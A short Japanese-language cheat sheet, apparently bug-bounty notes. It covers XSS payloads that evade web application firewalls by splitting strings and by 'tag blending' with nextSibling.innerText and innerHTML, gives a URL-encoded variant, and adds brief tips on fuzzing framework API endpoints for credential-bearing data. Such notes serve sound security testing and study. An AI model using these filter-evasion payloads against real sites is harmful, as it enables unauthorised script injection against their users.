### XSS

#### WAFバイパスについて
WAFは「(」と「)」の順序で括弧をキャッチする  
→文字列を複数の部分に分割したり、キーワードを分割したり、文字の順序を変更すればWAFを回避できる  

```
<svg+onload=location='javascript:alert(1)'>

↓これだとひっかかるから改造する

<svg onload=a=')',b='t(1',j='javas',s='cript:aler',location=j+s+b+a>

↓これをエンコードして実行する

%3Csvg%20onload%3Da%3D')'%2Cb%3D't(1'%2Cj%3D'javas'%2Cs%3D'cript%3Aaler'%2Clocation%3Dj%2Bs%2Bb%2Ba%3E

```

#### タグブレンディングによるWAFバイパス
nextSibling.innerTextを使用することで、次のタグの値を指定できる  
→これを利用してWAFバイパスをする

bタグで囲んだところを良いところで区切ってWAFバイパスを行う  

```
<svg onload=location=nextSibling.innerText>
<b>javas<b></b>cript:al<b></b>ert(1)</b>
```

↓inner/outerHTML プロパティベースのペイロードには次のものがある  

```
<svg onload=innerHTML=nextSibling.innerText>
<b><img/src/on<b></b>error=al<b></b>ert(1)></b>
```


### API
各フレームワークにあったエンドポイントリストを使ってファジング→ヒットしたURIにアクセスしてクレデンシャルなデータを保持しているAPIを見つける
Reactであればapp.jsが/に相当するため、setting.jsにアクセスすれな/settingに入れたりする
https://www.bugbountyhunter.com/guides/?type=javascript_files

### HTML反映テスト
シンプルだけど強力
test<h2>test1
